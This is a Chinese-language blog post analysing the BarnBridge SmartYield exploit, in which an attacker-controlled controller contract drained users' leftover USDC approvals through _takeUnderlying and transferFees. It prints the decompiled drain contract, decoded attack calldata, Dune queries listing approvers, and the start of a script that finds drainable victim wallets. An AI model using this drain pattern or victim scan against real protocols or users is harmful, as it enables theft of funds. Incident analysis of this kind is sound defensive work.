---
title: "BarnBridge SmartYield 攻击分析:$774943 —— 一次 $600 撬动的治理接管"
date: 2026-07-25T20:01:41+08:00
draft: false
author: yinhui
categories: ["security"]
tags: ["defi", "web3.0", "security"]
---

BarnBridge SmartYield 攻击分析

<!--more-->



## 基本信息:

ChainID: 1

TX: 0xd191fead1b9a2244f2837560f35d4fc865404914d229bfcb0172d1a7a9895afb (BLOCK: 25535120)

TARGET : 0xDAA037F99d168b552c0c61B7Fb64cF7819D78310 (verified)

HACKER: 0xf908610e9174c7cd6e9dfd371e238be4511297a1

分析高度: 25535120-1 = **25535119**



### TARGET 分析

0xDAA037F99d168b552c0c61B7Fb64cF7819D78310

通过链上数据得到:

Is Proxy : No
Contract Name : CompoundProvider
Source Verification : Verified on Etherscan
Compiler Version : v0.7.6+commit.7338295f

由于是verified, 所以我们可以下载它的源代码进行分析, 它提供的对外接口如下:

**State-changing**

| Source | Mutability | Selector     | Signature                            | Modifiers                    |
| ------ | ---------- | ------------ | ------------------------------------ | ---------------------------- |
| ABI    | nonpayable | `0xbbbf2df4` | `_depositProvider(uint256,uint256)`  | `onlySmartYieldOrController` |
| ABI    | nonpayable | `0xf147a80e` | `_sendUnderlying(address,uint256)`   | `onlySmartYield`             |
| ABI    | nonpayable | `0xa11b4f2a` | `_takeUnderlying(address,uint256)`   | `onlySmartYieldOrController` |
| ABI    | nonpayable | `0xef9f5d27` | `_withdrawProvider(uint256,uint256)` | `onlySmartYield`             |
| ABI    | nonpayable | `0xbd6d894d` | `exchangeRateCurrent()(uint256)`     | `(none)`                     |
| ABI    | nonpayable | `0x92eefe9b` | `setController(address)`             | `onlyControllerOrDao`        |
| ABI    | nonpayable | `0x2d34ba79` | `setup(address,address)`             | `(none)`                     |
| ABI    | nonpayable | `0xc2fbe7bc` | `transferFees()`                     | `(none)`                     |
| ABI    | nonpayable | `0x59356c5c` | `underlyingBalance()(uint256)`       | `(none)`                     |
| ABI    | nonpayable | `0x56a9a68b` | `updateAllowances()`                 | `(none)`                     |

**Read-only**

| Source | Mutability | Selector     | Signature                                | Modifiers   |
| ------ | ---------- | ------------ | ---------------------------------------- | ----------- |
| ABI    | view       | `0xbbba205d` | `EXP_SCALE()(uint256)`                   | `not found` |
| ABI    | view       | `0x33a581d2` | `MAX_UINT256()(uint256)`                 | `not found` |
| ABI    | view       | `0x7b3ee7fc` | `_setup()(bool)`                         | `not found` |
| ABI    | view       | `0x69e527da` | `cToken()(address)`                      | `not found` |
| ABI    | view       | `0xafe3bd8f` | `cTokenBalance()(uint256)`               | `not found` |
| ABI    | view       | `0xf77c4791` | `controller()(address)`                  | `not found` |
| ABI    | view       | `0x8023a1db` | `exchangeRateCurrentCached()(uint256)`   | `not found` |
| ABI    | view       | `0x3cf6276b` | `exchangeRateCurrentCachedAt()(uint256)` | `not found` |
| ABI    | view       | `0x788c8f0a` | `smartYield()(address)`                  | `not found` |
| ABI    | view       | `0x63315637` | `uToken()(address)`                      | `not found` |
| ABI    | view       | `0x5c20096d` | `underlyingFees()(uint256)`              | `not found` |

该合约是 BarnBridge Smart Yield 收益聚合系统的一部分，负责将底层资产（uToken）存入 Compound 的 cToken 以获取利息收益。合约通过 exchangeRateCurrent 更新并计算 cToken 兑换率。关键的资金操作（如 _depositProvider、_withdrawProvider、_sendUnderlying、_takeUnderlying）均受 onlySmartYield 或 onlySmartYieldOrController 修饰符保护，确保只有授权的 Smart Yield 合约或 Controller 合约可以执行。setController 允许 Controller 或 DAO 更改控制器地址；setup 用于一次性初始化底层代币和 cToken；transferFees 可提取累积的手续费；updateAllowances 用于更新代币授权。合约还提供多个查询函数，用于查看底层余额、cToken 余额、缓存的兑换率以及关联合约地址等。

先看view函数返回值:

```
## 返回指数缩放常量
EXP_SCALE()(uint256) : 1000000000000000000

##返回最大 uint256 值
MAX_UINT256()(uint256) : 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff

##返回合约是否已初始化
_setup()(bool): true

##返回 Compound cToken 地址
cToken()(address): 0x39AA39c021dfbaE8faC545936693aC917d5E7563  (Compound USD Coin / cUSDC)

## 返回持有的 cToken 余额
cTokenBalance()(uint256) :  784235313515431

## 返回当前 Controller 地址
controller()(address) : 0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580

## 返回从Compound获取当前汇率，并在当前区块中缓存它
exchangeRateCurrentCached()(uint256) : 253232499520081

## 缓存当前汇率的时候对应的block.timestamp
exchangeRateCurrentCachedAt()(uint256) : 1770614363

## 返回关联的 SmartYield 合约地址
smartYield()(address) : 0x4B8d90D68F26DEF303Dcb6CFc9b63A1aAEC15840 (BarnBridge junior cUSDC / bb_cUSDC)

## 返回底层资产代币地址
uToken()(address) : 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 (USDC)

## 返回累积的底层费用金额
underlyingFees()(uint256) : 0

```



### cToken

0x39AA39c021dfbaE8faC545936693aC917d5E7563, cUSDC, decimals 8, Is Proxy : No

cUSDC 是 Compound V2 协议的 cToken 实现，代表用户在借贷池中的份额。用户通过 mint 存入底层资产获得 cToken 并持续获得利息；通过 redeem 销毁 cToken 取回底层资产及利息；可将持有的 cToken 作为抵押品调用 borrow 借出其他资产，并需 repayBorrow 偿还借款及利息；第三方可调用 liquidateBorrow 对资不抵债的账户进行清算。合约管理员（admin）可设置利率模型、储备因子、Comptroller 等核心参数，且管理员转移采用两阶段流程（先 _setPendingAdmin 再 _acceptAdmin）。部分查询函数（如 borrowBalanceCurrent）会触发利息累计（accrueInterest），因此列为状态变更函数。

### uToken

底层资产代币, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 (USDC)

### smartYield

上层 SmartYield 代币合约, 0x4B8d90D68F26DEF303Dcb6CFc9b63A1aAEC15840,bb_cUSDC, decimals 6, Is Proxy : No

该合约是一个 ERC20 代币，并实现了分级债券系统。用户可以通过 buyTokens/sellTokens 函数使用底层资产买卖本代币，也可以购买两种不同风险等级的债券：优先级债券（senior）和次级债券（junior）。债券有到期日，到期后可赎回获得底层资产。次级债券承担更高风险，在特定条件下可被清算以保障优先级债券。合约提供全局债券统计、底层资产分配查询等功能，并由 controller 地址进行权限管理。

### controller

0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580 (Unverified), Is Proxy : Yes, Proxy Type : EIP-1967 Proxy, Deployed at block 25472222 by 0xf908610e9174c7cd6e9dfd371e238be4511297a1

Implement : 0x769A9fA1E2414db14B35c46E4095D6e8f1694565 (Unverified), Deployed at block 25535106 by 0xf908610e9174c7cd6e9dfd371e238be4511297a1

```
cast call '0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580' 'admin()' --from '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266' --block 25535119  --rpc-url $RPC_ETH
0x000000000000000000000000f908610e9174c7cd6e9dfd371e238be4511297a1
```

```
cast tx --json 0xd191fead1b9a2244f2837560f35d4fc865404914d229bfcb0172d1a7a9895afb --rpc-url $RPC_ETH | jq -r '"FROM: " + .from + "\nTO: " + .to'
FROM: 0xf908610e9174c7cd6e9dfd371e238be4511297a1
TO: 0x66c6f3b4b4b458e6d764759ecf122484ebef7580
```

admin 和 攻击TX的From 是同一个地址:0xf908610e9174c7cd6e9dfd371e238be4511297a1

> WTF: Controller ADMIN IS THE HACKER
>
> 也就是说 Controller的Admin调用Controller完成了这次攻击
>
> 先不着急, 继续理解Targe源代码, 后面再看Controller的源代码



现在看状态改变函数

### `_depositProvider(uint256 underlyingAmount_, uint256 takeFees_) onlySmartYieldOrController`

调用权限: 只有 smartYield 或 controller 能调用

业务: 把用户存进来的钱，拿去买 Compound 的理财产品（cToken），生息

参数含义:

- underlyingAmount_: 存入 Compound 的 underlying token（本实例为 USDC）数量
- takeFees_: 协议手续费，记为 underlyingFees。注意 underlyingAmount_ 是全额 mint 进 cToken 的，这部分照样在 Compound 生息，只是被 underlyingBalance() 从可分配余额中扣除、记为欠 feesOwner 的债

返回值: 无

内部实现:

- underlyingFees += takeFees_ — 记账抽水
- `ICompoundCumulator(controller)._beforeCTokenBalanceChange()` — 外部调用 controller 地址，无参数，无返回值检查
- IERC20(uToken).approve(address(cToken), underlyingAmount_) — 给 cToken 授权 underlying
- ICToken(cToken).mint(underlyingAmount_) — 存入 Compound，返回 0 = 成功
- `ICompoundCumulator(controller)._afterCTokenBalanceChange(cTokenBalance)` — 外部调用 controller 地址，传入当前 cTokenBalance（此时尚未更新，是旧值），无返回值检查
- cTokenBalance = cToken.balanceOf(this) — 更新为合约实际 cToken 余额

值得注意的地方:

- 调用前需要先 _takeUnderlying 把用户的 underlying token 拉到 Provider，否则 Provider 手里没钱，mint 会失败
- underlyingFees 只记账不转账，真正转走要走 transferFees()
- IERC20.approve（非 SafeERC20 的 safeApprove）是通用隐患：USDT 等不返回 bool 的 token 会 revert。但本实例 uToken=USDC 返回 bool，此处不会触发，仅作通用备注
- cTokenBalance 更新用的是 cToken.balanceOf(this)（合约实际余额），外部直接转入的 cToken 会被一并吸收，导致 underlyingBalance() 虚增

### `_takeUnderlying(address from_, uint256 underlyingAmount_) onlySmartYieldOrController`

调用权限: smartYield 或 controller 都能调

业务: 用户存款时，把用户的 underlying token 拉到 Provider 手里，为后续 _depositProvider 准备资金

参数含义:

- from_: 出款地址（通常是用户钱包）
- underlyingAmount_: 要拉入的 underlying token 数量

返回值: 无

值得注意的地方:

- 转账前后各读一次 Provider 自身的余额（uToken.balanceOf(this)），校验 余额变化 == underlyingAmount_——防止 fee-on-transfer token 导致实际到账少于预期
- 用 safeTransferFrom（非裸 transferFrom），兼容不返回 bool 的 token
- 用户需要提前 approve Provider 才能被拉走 token
- 与 _sendUnderlying 对称：一个读 Provider 余额变化校验入账，一个读 to_ 余额变化校验出账

### `_sendUnderlying(address to_, uint256 underlyingAmount_) onlySmartYield`

调用权限: 只有 smartYield 能调用

业务: 用户赎回时，把 Provider 手里的 underlying token 转给用户

参数含义:

- to_: 收款地址（通常是用户或 SmartYield）
- underlyingAmount_: 要转出的 underlying token 数量

返回值: 无

值得注意的地方:

- 转账前后各读一次 to_ 的余额，校验 余额变化 == underlyingAmount_——防止 fee-on-transfer token 导致实际到账少于预期
- 用 safeTransfer，不是裸 transfer，兼容不返回 bool 的 token
- 调此函数前需要先 _withdrawProvider 把 cToken 换回 underlying 放在 Provider 手里，否则 Provider 余额不够转账会失败
- 与 _takeUnderlying 对称：一个推钱出去给用户，一个拉钱进来做存款

### `_withdrawProvider(uint256 underlyingAmount_, uint256 takeFees_) onlySmartYield`

调用权限: 只有 smartYield 能调用

业务: 用户赎回时，把 cToken 从 Compound 换回 underlying token，放到 Provider 手里，后续再通过 _sendUnderlying 转给用户

参数含义:

- underlyingAmount_: 要从 Compound 赎回的 underlying token 数量
- takeFees_: 从中抽走的协议手续费，记为 underlyingFees

返回值: 无

内部实现:

- underlyingFees += takeFees_ — 记账抽水
- `ICompoundCumulator(controller)._beforeCTokenBalanceChange() `— 外部调用 controller 地址，无参数，无返回值检查
- ICToken(cToken).redeemUnderlying(underlyingAmount_) — 从 Compound 赎回 underlying，返回 0 = 成功
- `ICompoundCumulator(controller)._afterCTokenBalanceChange(cTokenBalance)` — 外部调用 controller 地址，传入当前 cTokenBalance（此时尚未更新，是旧值），无返回值检查
- cTokenBalance = cToken.balanceOf(this) — 更新为合约实际 cToken 余额

值得注意的地方:

- _withdrawProvider 与 _depositProvider 完全对称：两个 hook + Compound 操作 + cTokenBalance 更新，结构一致
- cTokenBalance 更新用的是合约实际余额，同样存在外部直接转入 cToken 被吸收的问题
- 调用链：_withdrawProvider → Provider 手里有了 underlying → _sendUnderlying → 用户收到钱
- 权限比 _depositProvider 更严：controller 可以调 _depositProvider 但不能调 _withdrawProvider。存取权限不对称

### setController(address newController_) onlyControllerOrDao

调用权限: 当前 controller 或 dao 可以调

业务: 更换 Controller 合约地址，同时转移 COMP 代币的 approve 授权（旧 controller 清零，新 controller 授权满额）

参数含义:

- newController_: 新的 Controller 合约地址

返回值: 无

值得注意的地方:

- 先把旧 controller 的 COMP approve 清零（rewardToken.safeApprove(controller, 0)），防止旧 controller 还能通过 transferFrom 动 Provider 手里的 COMP
- 然后改 controller 状态变量为新地址
- 最后调 updateAllowances() 给新 controller 授权 MAX_UINT256 的 COMP approve
- 只处理了 COMP 的 approve 迁移，不涉及 underlying token——Provider 不给 Controller approve underlying，_depositProvider 里 approve 的是 cToken 地址
- 用 safeApprove 而非裸 approve，兼容非标准 token

### exchangeRateCurrent() → uint256

调用权限: public，谁都能调

业务: 获取 Compound 当前的 cToken 兑换率，同区块内缓存，避免重复跨合约调用

参数含义: 无

返回值: exchangeRateCurrentCached（1 cToken 值多少 underlying，18 位精度）

值得注意的地方:

- 缓存策略: block.timestamp > exchangeRateCurrentCachedAt 时，调 ICToken(cToken).exchangeRateCurrent() 更新缓存
- 用 block.timestamp 而非 block.number 做缓存键

### setup(address smartYield_, address controller_) 无 modifier

调用权限: external，任何人都能调，但 _setup 标志位保证只执行一次

业务: 初始化 Provider，绑定 SmartYield 和 Controller 地址，进入 Compound 市场，设好 COMP 授权

参数含义:

- smartYield_: SmartYield 合约地址
- controller_: Controller 合约地址

返回值: 无

值得注意的地方:

- _setup 从默认值 false 变为 true，不可撤销
- 初始化顺序: 设 smartYield 和 controller → _enterMarket() → updateAllowances() → _setup = true
- _enterMarket() 调 comptroller.enterMarkets([cToken])，让 Compound 的 Comptroller 记录这个地址参与了 cToken 市场
- 没有 onlyDao 或类似保护——依赖部署者在同一交易里立即调 setup，抢跑者即使抢先调了，设的 smartYield 和 controller 也不是部署者期望的地址，原系统不会再用这个 Provider

### transferFees() 无 modifier

调用权限: external，任何人都能调

业务: 把累计的 underlyingFees 从 Compound 赎回并转给 feesOwner

参数含义: 无

返回值: 无

值得注意的地方:

- _withdrawProviderInternal(underlyingFees, 0) — 从 Compound 赎回 underlyingFees 量的 underlying
- underlyingFees = 0 — 记账清零
- uint256 fees = IERC20(uToken).balanceOf(address(this)) — 读的是 Provider **全部** uToken 余额，不只是刚赎回的 underlyingFees。如果 Provider 里本就残留了非 fee 的 uToken，会一并被扫走转给 feesOwner
- address to = CompoundController(controller).feesOwner() — 外部调用 controller 地址上的 feesOwner() 获取收钱地址
- 无权限限制，任何人都能触发

### underlyingBalance() → uint256

调用权限: external，谁都能调

业务: 返回 Provider 当前在 Compound 中持有 cToken 对应的 underlying 总量（扣掉手续费记账）

参数含义: 无

返回值: cTokenBalance × exchangeRateCurrent() / 1e18 - underlyingFees

值得注意的地方:

- cTokenBalance 是上次 _depositProvider 或 _withdrawProvider 时记录的合约实际 cToken 余额
- exchangeRateCurrent() 内部调 ICToken(cToken).exchangeRateCurrent()，每次跨区块触发 Compound 利息累积
- 如果两次 deposit/withdraw 之间有人直接转 cToken 给 Provider，cTokenBalance 不会反映，直到下一次 deposit/withdraw 才更新
- underlyingFees 是记账值，不是实际已转走的金额

### updateAllowances() 无 modifier

调用权限: public，谁都能调

业务: 把 Provider 持有的 COMP 代币给 controller 设满额 approve

参数含义: 无

返回值: 无

值得注意的地方:

- 用 safeIncreaseAllowance 增量式授权：拿到当前 controller 对 COMP 的 allowance，补差到 MAX_UINT256
- 只涉及 COMP 代币，不涉及 underlying token
- 无权限限制

## 系统的资金与信任

通过上面的各个函数的分析和代码分析, 我们能得到

### 系统中的角色

| 角色       | 身份                           | 定义来源                                                     |
| :--------- | :----------------------------- | :----------------------------------------------------------- |
| SmartYield | 产品层，对用户暴露存/取接口    | Provider 状态变量 `smartYield`，由 `setup` 写入              |
| Controller | 策略层，管理收益率和 COMP 收割 | Provider 状态变量 `controller`，由 `setup` 写入，可通过 `setController` 替换 |
| DAO        | 治理                           | `Governed` 里的 `dao`，可换 `controller`（通过 `setController` 的 `onlyControllerOrDao` 间接参与） |
| 用户       | 存钱/取钱的人                  | 给 Provider approve uToken，通过 SmartYield 操作，不在 Provider 里有直接权限 |
| feesOwner  | 收手续费的地址                 | 通过 `transferFees` 被动接收，`CompoundController(controller).feesOwner()` 读取 |
| 任何人     | 外部地址                       | 可调用无 modifier 的函数                                     |



### 资金流向

存款

```
用户
 │ approve uToken 给 Provider
 │
SmartYield/Controller 调 _takeUnderlying(from=用户, amount)
 │ uToken: 用户 → Provider
 │
SmartYield/Controller 调 _depositProvider(amount, fees)
 │ ① underlyingFees += fees
 │ ② controller._beforeCTokenBalanceChange()
 │ ③ uToken.approve(cToken, amount)
 │ ④ cToken.mint(amount)           → uToken: Provider → Compound
 │                                   → cToken: Compound → Provider
 │ ⑤ controller._afterCTokenBalanceChange(旧cTokenBalance)
 │ ⑥ cTokenBalance = cToken.balanceOf(this)
```

取款/赎回

```
SmartYield 调 _withdrawProvider(amount, fees)
 │ ① underlyingFees += fees
 │ ② controller._beforeCTokenBalanceChange()
 │ ③ cToken.redeemUnderlying(amount)  → cToken: Provider → Compound
 │                                      → uToken: Compound → Provider
 │ ④ controller._afterCTokenBalanceChange(旧cTokenBalance)
 │ ⑤ cTokenBalance = cToken.balanceOf(this)
 │
SmartYield 调 _sendUnderlying(to=用户, amount)
 │ uToken: Provider → 用户
```



手续费

```
任何人 调 transferFees()
 │ ① _withdrawProviderInternal(underlyingFees, 0)  → 从 Compound 赎回 underlyingFees
 │ ② underlyingFees = 0
 │ ③ uToken.balanceOf(this)                        → 读 Provider 全部 uToken 余额
 │ ④ uToken.safeTransfer(feesOwner, 全部余额)        → 全部转走
```



### 权限矩阵

| Function                          | SmartYield | Controller |  DAO | 任何人 |
| :-------------------------------- | ---------: | ---------: | ---: | -----: |
| `_takeUnderlying`（拉钱入池）     |          ✓ |          ✓ |      |        |
| `_depositProvider`（存入生息）    |          ✓ |          ✓ |      |        |
| `_withdrawProvider`（赎回出池）   |          ✓ |            |      |        |
| `_sendUnderlying`（转钱给用户）   |          ✓ |            |      |        |
| `setController`（换策略合约）     |            |          ✓ |    ✓ |        |
| `transferFees`（手续费提现）      |            |            |      |      ✓ |
| `updateAllowances`（授权 COMP）   |            |            |      |      ✓ |
| `exchangeRateCurrent`（查汇率）   |            |            |      |      ✓ |
| `underlyingBalance`（查池子余额） |            |            |      |      ✓ |
| `setup`（初始化）                 |            |            |      | 仅一次 |





## 恶意Controller

由于我们先前探测到

```
cast call '0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580' 'admin()' --from '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266' --block 25535119  --rpc-url $RPC_ETH
0x000000000000000000000000f908610e9174c7cd6e9dfd371e238be4511297a1

cast tx --json 0xd191fead1b9a2244f2837560f35d4fc865404914d229bfcb0172d1a7a9895afb --rpc-url $RPC_ETH | jq -r '"FROM: " + .from + "\nTO: " + .to'
FROM: 0xf908610e9174c7cd6e9dfd371e238be4511297a1
TO: 0x66c6f3b4b4b458e6d764759ecf122484ebef7580
```

也就是 controller(0x66c6f3b4b4b458e6d764759ecf122484ebef7580) 的 admin(0xf908610e9174c7cd6e9dfd371e238be4511297a1) 调用 controller 完成了攻击

那么重点自然转移到了controller上

0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580 (Unverified):  Is Proxy Yes, Deployed at block 25472222 by hacker/admin (0xf908610e9174c7cd6e9dfd371e238be4511297a1) , implemention 0x769A9fA1E2414db14B35c46E4095D6e8f1694565 (Unverified), Deployed at block 25535106 by hacker/admin



**Resolved Functions — 0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580**

- ABI rows are confirmed via a verified contract ABI. Guess rows are signature-database matches on a raw selector found in bytecode — the actual name may differ due to selector collisions.
- Mutability from a verified ABI is authoritative; a trailing "?" marks a value inferred from bytecode, which may be wrong. State-changing functions are listed first — start audits there.

**Detected · Proxy**

**State-changing**

| Source | Mutability  | Selector     | Signature            |
| ------ | ----------- | ------------ | -------------------- |
| Guess  | nonpayable? | `0x3659cfe6` | `upgradeTo(address)` |

**Read-only**

| Source | Mutability | Selector     | Signature                   |
| ------ | ---------- | ------------ | --------------------------- |
| Guess  | view?      | `0x5c60da1b` | `implementation()(address)` |
| Guess  | view?      | `0xf851a440` | `admin()(address)`          |

**Detected · Implementation**

**State-changing**

| Source | Mutability  | Selector     | Signature                                 |
| ------ | ----------- | ------------ | ----------------------------------------- |
| Guess  | nonpayable? | `0xe321fa05` | `0xe321fa05(address,uint256[],uint256[])` |

**Read-only**

| Source | Mutability | Selector     | Signature                      |
| ------ | ---------- | ------------ | ------------------------------ |
| Guess  | pure?      | `0x3c9e3e7f` | `FEE_REDEEM_SENIOR_BOND()`     |
| Guess  | pure?      | `0x4162169f` | `dao()`                        |
| Guess  | pure?      | `0x4684129e` | `FEE_BUY_JUNIOR_TOKEN()`       |
| Guess  | pure?      | `0x566a9255` | `PAUSED_BUY_SENIOR_BOND()`     |
| Guess  | pure?      | `0x5e0a5ba6` | `_beforeCTokenBalanceChange()` |
| Guess  | pure?      | `0x79524b4c` | `providerRatePerDay()`         |
| Guess  | pure?      | `0x7fd08aa8` | `bondModel()`                  |
| Guess  | pure?      | `0xa2cff683` | `PAUSED_BUY_JUNIOR_TOKEN()`    |
| Guess  | pure?      | `0xb0612d69` | `BOND_LIFE_MAX()`              |
| Guess  | pure?      | `0xb656c31c` | `0xb656c31c()`                 |
| Guess  | pure?      | `0xf0eff645` | `feesOwner()`                  |



```

admin(): 0xF908610E9174c7cd6e9dfD371e238be4511297A1 (hacker/admin)

implementation()(address) : 0x769A9fA1E2414db14B35c46E4095D6e8f1694565

FEE_REDEEM_SENIOR_BOND(): 0

dao(): 0xF908610E9174c7cd6e9dfD371e238be4511297A1 (hacker/admin)

FEE_BUY_JUNIOR_TOKEN(): 0

PAUSED_BUY_SENIOR_BOND(): 0

_beforeCTokenBalanceChange(): No output

providerRatePerDay(): 0

bondModel(): 0x9AF77328a63dc58E4B936f5d4C298d288D36c9dA (Unverified, Deployed at block 25535105 by hacker/admin)

PAUSED_BUY_JUNIOR_TOKEN(): 0

BOND_LIFE_MAX(): 0x000000000000000000000000000000000000000000000000000000000000016d (365)

0xb656c31c(): reverted

feesOwner() : 0xF908610E9174c7cd6e9dfD371e238be4511297A1 (hacker/admin)


```

很明显, 这是一个伪造的恶意合约, 因为它将DAO和feesOwner都设置成了合约的admin自己

继续反编译逻辑合约看看

```solidity

pragma solidity 0.8.28;

interface IFeeCollectorTarget {
    function _takeUnderlying(address account, uint256 amount) external returns (uint256);
    function transferFees() external returns (uint256);
}

contract Decompiled {
    function _afterCTokenBalanceChange(uint256) external {}

    function BOND_LIFE_MAX() external pure returns (uint256) {
        return 365;
    }

    function bondModel() external pure returns (address) {
        return 0x9aF77328a63dC58e4B936f5d4c298D288d36C9DA;
    }

    function _beforeCTokenBalanceChange() external {}

    function dao() external pure returns (address) {
        return 0xF908610e9174C7cD6e9DfD371E238be4511297A1;
    }

    function FEE_BUY_JUNIOR_TOKEN() external payable {}

    function PAUSED_BUY_SENIOR_BOND() external payable {}

    function providerRatePerDay() external payable {}

    function PAUSED_BUY_JUNIOR_TOKEN() external payable {}

    function FEE_REDEEM_SENIOR_BOND() external pure returns (uint256) {
        return 0;
    }

    function feesOwner() external pure returns (address) {
        return 0xF908610e9174C7cD6e9DfD371E238be4511297A1;
    }

    // 0xe321fa05
    function func_e321fa05(
        address target,
        address[] calldata accounts,
        uint256[] calldata amounts
    ) external {
        require(accounts.length == amounts.length, "length mismatch");
        for (uint256 i = 0; i < accounts.length; i++) {
            if (amounts[i] != 0) {
                IFeeCollectorTarget(target)._takeUnderlying(accounts[i], amounts[i]);
            }
        }
        IFeeCollectorTarget(target).transferFees();
    }
}
```



### 为什么把dao()设置为自己

```solidity
    modifier onlyControllerOrDao {
      require(
        msg.sender == controller || msg.sender == CompoundController(controller).dao(),
        "PPC: only controller/DAO"
      );
      _;
    }
    
    
     function setController(address newController_)
      external override
      onlyControllerOrDao
    {
        //...
    }
```

因为只有 自己 或 自己返回的dao() 能把自己换掉, 所以把换controller的权限全部集于自己, 防止自己被换掉



### 漏洞 与 为什么把feesOwner()设置为自己

当然是为了调用transferFees() 将手续费转给自己以获利.  但这里的"手续费"有一个不恰当的逻辑 `uint256 fees = IERC20(uToken).balanceOf(address(this));` : 默认CompoundProvider中的所有uToken(USDC)余额都是手续费

```solidity
    function transferFees()
      external
      override
    {
      _withdrawProviderInternal(underlyingFees, 0);
      underlyingFees = 0;

      uint256 fees = IERC20(uToken).balanceOf(address(this));
      address to = CompoundController(controller).feesOwner();

      IERC20(uToken).safeTransfer(to, fees);

      emit TransferFees(msg.sender, to, fees);
    }
```

之所以说将uToken(USDC)余额都当做手续费是错误的, 因为_takeUnderlying也会增加 IERC20(uToken).balanceOf(address(this))

```solidity
    function _takeUnderlying(address from_, uint256 underlyingAmount_)
      external override
      onlySmartYieldOrController
    {
        uint256 balanceBefore = IERC20(uToken).balanceOf(address(this));
        IERC20(uToken).safeTransferFrom(from_, address(this), underlyingAmount_);
        uint256 balanceAfter = IERC20(uToken).balanceOf(address(this));
        require(
          0 == (balanceAfter - balanceBefore - underlyingAmount_),
          "PPC: _takeUnderlying amount"
        );
    }
```

所以攻击思路就有了 : 将自己设置为feeOwner, 在_takeUnderlying之后直接调用transferFees, 管他是不是手续费, 将USDC全部收走

权限全部具备: transferFees是public, _takeUnderlying是 onlySmartYieldOrController, 而黑客控制着恶意controller



###  func_e321fa05

```solidity
    function func_e321fa05(
        address target,
        address[] calldata accounts,
        uint256[] calldata amounts
    ) external {
        require(accounts.length == amounts.length, "length mismatch");
        for (uint256 i = 0; i < accounts.length; i++) {
            if (amounts[i] != 0) {
                IFeeCollectorTarget(target)._takeUnderlying(accounts[i], amounts[i]);
            }
        }
        IFeeCollectorTarget(target).transferFees();
    }
```



解码实际攻击TX (0xd191fead1b9a2244f2837560f35d4fc865404914d229bfcb0172d1a7a9895afb) 中调用 func_e321fa05 时的codedata得到

```
2026-07-23T13:14:47.873769Z  WARN couldn't find any resolved matches for 'e321fa05'
  [500] heimdall::decode()
    │ 
    ├─ signature: Unresolved_e321fa05(address, address[], uint32[])
    │ 
    ├─ input 0:   address 0xDAA037F99d168b552c0c61B7Fb64cF7819D78310
    ├─       1:   [
    │                address 0x20C76D4203BF7490615804FE4fe9B132EE3E0935
    │                address 0xe77884CDdF148DD5f0e9191B33D8dBAdDB16DFB5
    │                address 0x71F12a5b0E60d2Ff8A87FD34E7dcff3c10c914b0
    │                address 0xB1C120957a5b5C45A15fd6e5E17f5A2B70bF49d0
	│				<省略...>
    │                address 0x1Dd01835E0Eb26ABe597e2e69FfAC1A6cd00283A
    │             ]
    ├─       2:   [
    │                uint    125628402942
    │                uint    100149478376
    │                uint    85660000000
    │                uint    78218427082
    │                <省略...>
    │                uint    160787907
    │             ]
    └─ ← ()
```



其中 0xDAA037F99d168b552c0c61B7Fb64cF7819D78310 就是 CompoundProvider

然后 `CompoundProvider._takeUnderlying(from_, underlyingAmount_)` 调用 `IERC20(uToken).safeTransferFrom(from_, address(this), underlyingAmount_)`

这就涉及到2个问题

1, `safeTransferFrom` 必须先得到`from_`在``IERC20(uToken)` (USDC) 上的 `approve`, 攻击者如何知道用户刚好approve了, 并且还没来得及发起存款业务, 因为存款业务会将approve的USDC按照正常流程划走 或者 发起了存款 但是approve的额度大于实际存款的额度, 也就是用户在以前存款的时候: 

- 用户进行了"Approve 无限授权"
- 授权量 > 实际用掉量

2, `approve`的数量是多少. 因为这里直接传入的硬编码的精确数量





### 找到授权者

使用dune query

```sql
SELECT COUNT(DISTINCT varbinary_substring(topic1,13,20)) AS approvers
FROM ethereum.logs
WHERE contract_address = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48
  AND topic0 = 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
  AND topic2 = 0x000000000000000000000000daa037f99d168b552c0c61b7fb64cf7819d78310
  AND block_number BETWEEN 12024574 AND 25535119;
```

得到了671, 也就是671个地址曾经对CompoundProvider进行过USDC授权

```sql
SELECT DISTINCT varbinary_substring(topic1, 13, 20) AS owner
FROM ethereum.logs
WHERE contract_address = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48          -- USDC
  AND topic0 = 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925  -- Approval(owner,spender,value)
  AND topic2 = 0x000000000000000000000000daa037f99d168b552c0c61b7fb64cf7819d78310  -- spender = Provider 0xDAA0
  AND block_number BETWEEN 12024574 AND 25535119                            -- Provider creation → PRE_BLOCK
```

> 由于dune限制了免费用户的导出条数, 所以我只拿到100条

```
0x59ef283bcc58affcfca175b7f55fb994f6acde84
0x8841e5a990f242fdfd24413969f214b28ccc6161
0x58fde4c9ca7b5357674d847d925aa8f31594b477
...
0xde7e8fb53e3eba9d49cb0bfbb9a93ac63aed07be
0x98a3093d0ecaedefc4fa01f1a44c6a8e8088045d
0x93100c6082321d7369d3d61ea5ffff0c697631d1
```



### 从授权者从筛选受害者候选

有授权残留并且账上有钱的就是候选受害者

```
drainable(user) = min( USDC.balanceOf(user),  USDC.allowance(user, Provider) )  > 0
```

变现扫描脚本

```python
#!/usr/bin/env python3
"""
Phase 2 — reproduce the attacker's approval scan.

For every candidate owner (from Dune Phase 1), read at PRE_BLOCK:
    USDC.allowance(owner, Provider)   <- authoritative standing allowance
    USDC.balanceOf(owner)
and compute:
    drainable = min(allowance, balance)   (raw integer, 6-dp USDC units)

An owner is harvestable via _takeUnderlying <=> drainable > 0.

Usage:
    export RPC_ETH=...            # archive node (Alchemy)
    python3 phase2_scan.py
"""

import csv
import os
import subprocess
import sys
from pathlib import Path

# ---- constants ----
USDC     = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
PROVIDER = "0xDAA037F99d168b552c0c61B7Fb64cF7819D78310"
